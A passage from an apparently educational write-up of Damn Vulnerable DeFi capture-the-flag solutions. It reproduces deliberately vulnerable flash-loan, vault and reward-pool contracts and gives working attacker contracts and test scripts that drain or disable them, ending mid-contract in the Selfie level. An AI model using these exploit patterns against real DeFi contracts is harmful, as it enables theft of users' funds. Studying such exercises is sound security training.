Below, you'll find solutions to challenges of [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/).

# 1. Unstoppable

## Contracts

_UnstoppableVault.sol_

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solmate/src/utils/FixedPointMathLib.sol";
import "solmate/src/utils/ReentrancyGuard.sol";
import { SafeTransferLib, ERC4626, ERC20 } from "solmate/src/mixins/ERC4626.sol";
import "solmate/src/auth/Owned.sol";
import { IERC3156FlashBorrower, IERC3156FlashLender } from "@openzeppelin/contracts/interfaces/IERC3156.sol";

/**
 * @title UnstoppableVault
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626 {
    using SafeTransferLib for ERC20;
    using FixedPointMathLib for uint256;

    uint256 public constant FEE_FACTOR = 0.05 ether;
    uint64 public constant GRACE_PERIOD = 30 days;

    uint64 public immutable end = uint64(block.timestamp) + GRACE_PERIOD;

    address public feeRecipient;

    error InvalidAmount(uint256 amount);
    error InvalidBalance();
    error CallbackFailed();
    error UnsupportedCurrency();

    event FeeRecipientUpdated(address indexed newFeeRecipient);

    constructor(ERC20 _token, address _owner, address _feeRecipient)
        ERC4626(_token, "Oh Damn Valuable Token", "oDVT")
        Owned(_owner)
    {
        feeRecipient = _feeRecipient;
        emit FeeRecipientUpdated(_feeRecipient);
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function maxFlashLoan(address _token) public view returns (uint256) {
        if (address(asset) != _token)
            return 0;

        return totalAssets();
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function flashFee(address _token, uint256 _amount) public view returns (uint256 fee) {
        if (address(asset) != _token)
            revert UnsupportedCurrency();

        if (block.timestamp < end && _amount < maxFlashLoan(_token)) {
            return 0;
        } else {
            return _amount.mulWadUp(FEE_FACTOR);
        }
    }

    function setFeeRecipient(address _feeRecipient) external onlyOwner {
        if (_feeRecipient != address(this)) {
            feeRecipient = _feeRecipient;
            emit FeeRecipientUpdated(_feeRecipient);
        }
    }

    /**
     * @inheritdoc ERC4626
     */
    function totalAssets() public view override returns (uint256) {
        assembly { // better safe than sorry
            if eq(sload(0), 2) {
                mstore(0x00, 0xed3ba6a6)
                revert(0x1c, 0x04)
            }
        }
        return asset.balanceOf(address(this));
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address _token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
        uint256 fee = flashFee(_token, amount);
        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);
        // callback must return magic value, otherwise assume it failed
        if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256("IERC3156FlashBorrower.onFlashLoan"))
            revert CallbackFailed();
        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);
        return true;
    }

    /**
     * @inheritdoc ERC4626
     */
    function beforeWithdraw(uint256 assets, uint256 shares) internal override nonReentrant {}

    /**
     * @inheritdoc ERC4626
     */
    function afterDeposit(uint256 assets, uint256 shares) internal override nonReentrant {}
}
```

_ReceiverUnstoppable.sol_

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solmate/src/auth/Owned.sol";
import { UnstoppableVault, ERC20 } from "../unstoppable/UnstoppableVault.sol";

/**
 * @title ReceiverUnstoppable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverUnstoppable is Owned, IERC3156FlashBorrower {
    UnstoppableVault private immutable pool;

    error UnexpectedFlashLoan();

    constructor(address poolAddress) Owned(msg.sender) {
        pool = UnstoppableVault(poolAddress);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        if (initiator != address(this) || msg.sender != address(pool) || token != address(pool.asset()) || fee != 0)
            revert UnexpectedFlashLoan();

        ERC20(token).approve(address(pool), amount);

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    function executeFlashLoan(uint256 amount) external onlyOwner {
        address asset = address(pool.asset());
        pool.flashLoan(
            this,
            asset,
            amount,
            bytes("")
        );
    }
}
```

## Solution

Before attempting this challenge, I highly recommend familiarizing yourself with [flash loans](https://www.rareskills.io/post/erc-3156) and [token vaults](https://www.rareskills.io/post/erc4626).

Now, to get an idea of the starting conditions of this challenge, let's first take a closer look at the _unstoppable.challenge.js_ file.

_unstoppable.challenge.js_

```javascript
const { ethers } = require('hardhat')
const { expect } = require('chai')

describe('[Challenge] Unstoppable', function () {
  let deployer, player, someUser
  let token, vault, receiverContract

  const TOKENS_IN_VAULT = 1000000n * 10n ** 18n
  const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    ;[deployer, player, someUser] = await ethers.getSigners()

    token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy()
    vault = await (
      await ethers.getContractFactory('UnstoppableVault', deployer)
    ).deploy(
      token.address,
      deployer.address, // owner
      deployer.address // fee recipient
    )
    expect(await vault.asset()).to.eq(token.address)

    await token.approve(vault.address, TOKENS_IN_VAULT)
    await vault.deposit(TOKENS_IN_VAULT, deployer.address)

    expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT)
    expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT)
    expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT)
    expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT)
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0)
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT)).to.eq(50000n * 10n ** 18n)

    await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE)
    expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE)

    // Show it's possible for someUser to take out a flash loan
    receiverContract = await (
      await ethers.getContractFactory('ReceiverUnstoppable', someUser)
    ).deploy(vault.address)
    await receiverContract.executeFlashLoan(100n * 10n ** 18n)
  })

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
  })

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // It is no longer possible to execute flash loans
    await expect(receiverContract.executeFlashLoan(100n * 10n ** 18n)).to.be.reverted
  })
})
```

As we can see from the above code, the `before` hook sets up the challenge as follows:

1. The deployer (who has a DVT balance of `type(uint256).max` after deploying the DVT contract) first deposits 1,000,000 DVT via the vault's `deposit` function. This means that, after the deposit, the vault holds 1,000,000 DVT, and the deployer holds 1,000,000 shares - let's call them "S tokens". In particular, S now has a total supply of 1,000,000.
2. After making the deposit, the deployer then sends 10 DVT to the player.

Our goal is to make the vault stop offering flash loans. In other words, we're looking for a way to DoS the `flashLoan` function.

To start, notice that `flashLoan` contains various `revert` statements. If we can somehow achieve that one of these `revert`s is triggered with every function call, then we'd complete the challenge.

Taking a closer look, we see that the lines

```solidity
uint256 balanceBefore = totalAssets();
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

are indeed vulnerable!

To see that, let's first take a closer look at `convertToShares`:

```solidity
function convertToShares(uint256 assets) public view virtual returns (uint256) {
    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
}
```

First, notice that we _don't_ have the case `supply == 0` after performing our initial setup since the total supply of S tokens is 1,000,000 after the deployer made the initial deposit. So, roughly speaking, the function will perform the following calculation:

```
assets * supply / totalAssets()
```

Now, in the `flashLoan` function, the `asset` parameter is set to `totalSupply`, i.e., the total supply of S tokens. Ignoring decimals, the above calculation will, therefore, yield 1,000,000 \* 1,000,000 / 1,000,000 since `supply` (i.e., the total supply of S) and `totalAssets()` (i.e., the vault's DVT balance) are equal to 1,000,000.

So far, nothing bad happened. However, notice that **we can donate DVT to the vault without calling `deposit`!**

If we, e.g., donate 1 DVT, we'll end up with `balanceBefore` being 1,000,001 while `convertToShares(totalSupply)` being 1,000,000 \* 1,000,000 / 1,000,001. In other words, by simply transferring 1 DVT to the vault (using DVT's `transfer`, not the vault's `deposit`!), we can achieve that `convertToShares(totalSupply) != balanceBefore` will be `true` and `flashLoan` will revert.

As a conclusion, we simply need to add the following line to _unstoppable.challenge.js_:

```javascript
it('Execution', async function () {
  /** CODE YOUR SOLUTION HERE */
  await token.connect(player).transfer(vault.address, 1n * 10n ** 18n)
})
```

# 2. Naive Receiver

## Contract

_FlashLoanReceiver.sol_

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanReceiver is IERC3156FlashBorrower {

    address private pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    error UnsupportedCurrency();

    constructor(address _pool) {
        pool = _pool;
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        assembly { // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }
        
        if (token != ETH)
            revert UnsupportedCurrency();
        
        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal { }

    // Allow deposits of ETH
    receive() external payable {}
}
```

_NaiveReceiverLenderPool.sol_

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "./FlashLoanReceiver.sol";

/**
 * @title NaiveReceiverLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender {

    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    error RepayFailed();
    error UnsupportedCurrency();
    error CallbackFailed();

    function maxFlashLoan(address token) external view returns (uint256) {
        if (token == ETH) {
            return address(this).balance;
        }
        return 0;
    }

    function flashFee(address token, uint256) external pure returns (uint256) {
        if (token != ETH)
            revert UnsupportedCurrency();
        return FIXED_FEE;
    }

    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        if (token != ETH)
            revert UnsupportedCurrency();
        
        uint256 balanceBefore = address(this).balance;

        // Transfer ETH and handle control to receiver
        SafeTransferLib.safeTransferETH(address(receiver), amount);
        if(receiver.onFlashLoan(
            msg.sender,
            ETH,
            amount,
            FIXED_FEE,
            data
        ) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (address(this).balance < balanceBefore + FIXED_FEE)
            revert RepayFailed();

        return true;
    }

    // Allow deposits of ETH
    receive() external payable {}
}
```

## Solution

Before attempting this challenge, I highly recommend familiarizing yourself with [flash loans](https://www.rareskills.io/post/erc-3156).

The goal of this level is to reduce the entire balance of `FlashLoanReceiver` from 10 ETH to 0 ETH.

First, notice that `NaiveReceiverLenderPool` provides flash loans at a fixed fee of 1 ETH.
Second, notice that the receiver's `onFlashLoan()` disregards its `initiator` parameter, letting anyone initiate flash loans.
Therefore, we can solve this level by making ten subsequent calls to `flashLoan()` on the `FlashLoanReceiver`'s behalf.
To pull off the attack in a single transaction, we can deploy an attacker contract that makes those calls via a loop in its constructor:

_NaiveReceiverAttacker.sol_

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaiveReceiverLenderPool {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}


contract NaiveReceiverAttacker {

    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address pool, address receiver) {
        for (uint256 i; i < 10; i++) {
            INaiveReceiverLenderPool(pool).flashLoan(receiver, ETH, 0, "0x");
        }
    }
}
```

_naive-receiver.challenge.js_

```javascript
...
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    const AttackerFactory = await ethers.getContractFactory('NaiveReceiverAttacker', player);
    await AttackerFactory.deploy(pool.address, receiver.address);
});
...
```

# 3. Truster

## Contract

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
}
```

## Solution

To solve this challenge, note that `flashLoan` allows for arbitrary function calls on the `target` contract. In other words, by calling `flashLoan`, we can make arbitrary function calls on the `TrusterLenderPool` contract's behalf.

In particular, we can approve an attacker contract for the entire pool balance of DVT tokens! (Notice that we need to specify `amount = 0` when calling `flashLoan` for this to work. Otherwise, we'll trigger the `RepayFailed()` error.)

Once `TrusterLenderPool` has approved us to transfer funds on its behalf, we can use `transferFrom` to drain the entire pool.

_TrusterAttacker.sol_

```solidity
// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

contract TrusterAttacker {
    DamnValuableToken public immutable token;
    TrusterLenderPool public immutable pool;

    constructor(DamnValuableToken _token, TrusterLenderPool _pool) {
        token = _token;
        pool = _pool;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 1_000_000 ether);
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), msg.sender, 1_000_000 ether);
    }
}
```

_truster.challenge.js_

```javascript
const { ethers } = require('hardhat')
const { expect } = require('chai')

describe('[Challenge] Truster', function () {
  let deployer, player
  let token, pool

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    ;[deployer, player] = await ethers.getSigners()

    token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy()
    pool = await (
      await ethers.getContractFactory('TrusterLenderPool', deployer)
    ).deploy(token.address)
    expect(await pool.token()).to.eq(token.address)

    await token.transfer(pool.address, TOKENS_IN_POOL)
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL)

    expect(await token.balanceOf(player.address)).to.equal(0)
  })

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    attacker = await (
      await ethers.getContractFactory('TrusterAttacker', deployer)
    ).deploy(token.address, pool.address)

    await attacker.connect(player).attack()
  })

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL)
    expect(await token.balanceOf(pool.address)).to.equal(0)
  })
})
```

# 4. Side Entrance

## Contract

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    mapping(address => uint256) private balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        
        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore)
            revert RepayFailed();
    }
}
```

## Solution

To solve this level, we can simply:

1. Request a flash loan.
2. Deposit the borrowed assets back into the pool to increase our balance in the `balances` mapping.
3. Withdraw all funds we "deposited" earlier.

_SideEntranceAttacker.sol_

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}


contract SideEntranceAttacker {

    IPool immutable pool;
    address immutable player;

    constructor(address _pool, address _player){
        pool = IPool(_pool);
        player = _player;
    }

    receive() external payable {}

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool success, ) = player.call{value: address(this).balance}("");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
```

_side-entrance.challenge.js_

```javascript
...
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    let attacker = await (await ethers.getContractFactory('SideEntranceAttacker', player)).deploy(
        pool.address, player.address
    );
    await attacker.attack();
});
...
```

# 5. The Rewarder

## Contracts

_AccountingToken.sol_

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "solady/src/auth/OwnableRoles.sol";

/**
 * @title AccountingToken
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @notice A limited pseudo-ERC20 token to keep track of deposits and withdrawals
 *         with snapshotting capabilities.
 */
contract AccountingToken is ERC20Snapshot, OwnableRoles {
    uint256 public constant MINTER_ROLE = _ROLE_0;
    uint256 public constant SNAPSHOT_ROLE = _ROLE_1;
    uint256 public constant BURNER_ROLE = _ROLE_2;

    error NotImplemented();

    constructor() ERC20("rToken", "rTKN") {
        _initializeOwner(msg.sender);
        _grantRoles(msg.sender, MINTER_ROLE | SNAPSHOT_ROLE | BURNER_ROLE);
    }

    function mint(address to, uint256 amount) external onlyRoles(MINTER_ROLE) {
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external onlyRoles(BURNER_ROLE) {
        _burn(from, amount);
    }

    function snapshot() external onlyRoles(SNAPSHOT_ROLE) returns (uint256) {
        return _snapshot();
    }

    function _transfer(address, address, uint256) internal pure override {
        revert NotImplemented();
    }

    function _approve(address, address, uint256) internal pure override {
        revert NotImplemented();
    }
}
```

_FlashLoanerPool.sol_

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A simple pool to get flashloans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    error NotEnoughTokenBalance();
    error CallerIsNotContract();
    error FlashLoanNotPaidBack();

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));

        if (amount > balanceBefore) {
            revert NotEnoughTokenBalance();
        }

        if (!msg.sender.isContract()) {
            revert CallerIsNotContract();
        }

        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));

        if (liquidityToken.balanceOf(address(this)) < balanceBefore) {
            revert FlashLoanNotPaidBack();
        }
    }
}
```

_RewardToken.sol_

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "solady/src/auth/OwnableRoles.sol";

/**
 * @title RewardToken
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract RewardToken is ERC20, OwnableRoles {
    uint256 public constant MINTER_ROLE = _ROLE_0;

    constructor() ERC20("Reward Token", "RWT") {
        _initializeOwner(msg.sender);
        _grantRoles(msg.sender, MINTER_ROLE);
    }

    function mint(address to, uint256 amount) external onlyRoles(MINTER_ROLE) {
        _mint(to, amount);
    }
}
```

_TheRewarderPool.sol_

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/FixedPointMathLib.sol";
import "solady/src/utils/SafeTransferLib.sol";
import { RewardToken } from "./RewardToken.sol";
import { AccountingToken } from "./AccountingToken.sol";

/**
 * @title TheRewarderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TheRewarderPool {
    using FixedPointMathLib for uint256;

    // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;
    
    uint256 public constant REWARDS = 100 ether;

    // Token deposited into the pool by users
    address public immutable liquidityToken;

    // Token used for internal accounting and snapshots
    // Pegged 1:1 with the liquidity token
    AccountingToken public immutable accountingToken;

    // Token in which rewards are issued
    RewardToken public immutable rewardToken;

    uint128 public lastSnapshotIdForRewards;
    uint64 public lastRecordedSnapshotTimestamp;
    uint64 public roundNumber; // Track number of rounds
    mapping(address => uint64) public lastRewardTimestamps;

    error InvalidDepositAmount();

    constructor(address _token) {
        // Assuming all tokens have 18 decimals
        liquidityToken = _token;
        accountingToken = new AccountingToken();
        rewardToken = new RewardToken();

        _recordSnapshot();
    }

    /**
     * @notice Deposit `amount` liquidity tokens into the pool, minting accounting tokens in exchange.
     *         Also distributes rewards if available.
     * @param amount amount of tokens to be deposited
     */
    function deposit(uint256 amount) external {
        if (amount == 0) {
            revert InvalidDepositAmount();
        }

        accountingToken.mint(msg.sender, amount);
        distributeRewards();

        SafeTransferLib.safeTransferFrom(
            liquidityToken,
            msg.sender,
            address(this),
            amount
        );
    }

    function withdraw(uint256 amount) external {
        accountingToken.burn(msg.sender, amount);
        SafeTransferLib.safeTransfer(liquidityToken, msg.sender, amount);
    }

    function distributeRewards() public returns (uint256 rewards) {
        if (isNewRewardsRound()) {
            _recordSnapshot();
        }

        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (amountDeposited > 0 && totalDeposits > 0) {
            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);
            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);
            }
        }
    }

    function _recordSnapshot() private {
        lastSnapshotIdForRewards = uint128(accountingToken.snapshot());
        lastRecordedSnapshotTimestamp = uint64(block.timestamp);
        unchecked {
            ++roundNumber;
        }
    }

    function _hasRetrievedReward(address account) private view returns (bool) {
        return (
            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp
                && lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
        );
    }

    function isNewRewardsRound() public view returns (bool) {
        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
}
```

## Solution

Before we look at the solution, let's first understand the four smart contracts involved in this challenge.
Not surprisingly, `RewardToken` is the ERC20 representing the rewards that are distributed by the pool.
The contract is ownable and has a minter role, which is granted to the owner, i.e., the deployer, upon deployment.
`AccountingToken` tracks users' deposits in the pool.
It records balances and supply at different points in time via ERC20 snapshots.
`FlashLoanerPool` offers flash loans in DVT tokens. 
Lastly, `TheRewarderPool` records snapshots, distributes rewards, and handles deposits and withdrawals.

Now, to manipulate `TheRewarderPool`'s rewards and solve the challenge, we can:

1. Take a DVT flash loan.
2. Stake those DVT tokens in `TheRewarderPool`.
3. Earn the corresponding rewards.
4. Withdraw our DVT tokens from the pool.
5. Pay back our flash loan.

Notice that this is only possible because `TheRewarderPool` doesn't take into account the time period the user staked, but only the staked amount at a certain point in time.

So, to complete the challenge, we can first create the following attacker

_TheRewarderAttacker.sol_

```solidity
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashloanPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amount) external;
    function distributeRewards() external returns (uint256 rewards);
    function withdraw(uint256 amount) external;
}

contract TheRewarderAttacker {

    IFlashloanPool immutable flashLoanPool;
    IRewardPool immutable rewardPool;
    IERC20 immutable liquidityToken;
    IERC20 immutable rewardToken;
    address immutable player;

    constructor(
        address _flashloanPool, address _rewardPool, address _liquidityToken, address _rewardToken
    ){
        flashLoanPool = IFlashloanPool(_flashloanPool);
        rewardPool = IRewardPool(_rewardPool);
        liquidityToken = IERC20(_liquidityToken);
        rewardToken = IERC20(_rewardToken);
        player = msg.sender;
    }

    function attack() external {
        flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));
    }


    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.distributeRewards();
        rewardPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }

}
```

and subsequently add the following commands to the challenge file to complete the level:

_the-rewarder.challenge.js_

```javascript
...
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
    let attacker = await (await ethers.getContractFactory("TheRewarderAttacker", player)).deploy(
        flashLoanPool.address, rewarderPool.address, liquidityToken.address, rewardToken.address
    )

    await attacker.attack();
});
...
```

# 6. Selfie

## Contracts

_ISimpleGovernance.sol_

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleGovernance {
    struct GovernanceAction {
        uint128 value;
        uint64 proposedAt;
        uint64 executedAt;
        address target;
        bytes data;
    }

    error NotEnoughVotes(address who);
    error CannotExecute(uint256 actionId);
    error InvalidTarget();
    error TargetMustHaveCode();
    error ActionFailed(uint256 actionId);

    event ActionQueued(uint256 actionId, address indexed caller);
    event ActionExecuted(uint256 actionId, address indexed caller);

    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
    function executeAction(uint256 actionId) external payable returns (bytes memory returndata);
    function getActionDelay() external view returns (uint256 delay);
    function getGovernanceToken() external view returns (address token);
    function getAction(uint256 actionId) external view returns (GovernanceAction memory action);
    function getActionCounter() external view returns (uint256);
}
```

_SelfiePool.sol_

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {

    ERC20Snapshot public immutable token;
    SimpleGovernance public immutable governance;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    error RepayFailed();
    error CallerNotGovernance();
    error UnsupportedCurrency();
    error CallbackFailed();

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        if (msg.sender != address(governance))
            revert CallerNotGovernance();
        _;
    }

    constructor(address _token, address _governance) {
        token = ERC20Snapshot(_token);
        governance = SimpleGovernance(_governance);
    }

    function maxFlashLoan(address _token) external view returns (uint256) {
        if (address(token) == _token)
            return token.balanceOf(address(this));
        return 0;
    }

    function flashFee(address _token, uint256) external view returns (uint256) {
        if (address(token) != _token)
            revert UnsupportedCurrency();
        return 0;
    }

    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external nonReentrant returns (bool) {
        if (_token != address(token))
            revert UnsupportedCurrency();

        token.transfer(address(_receiver), _amount);
        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS)
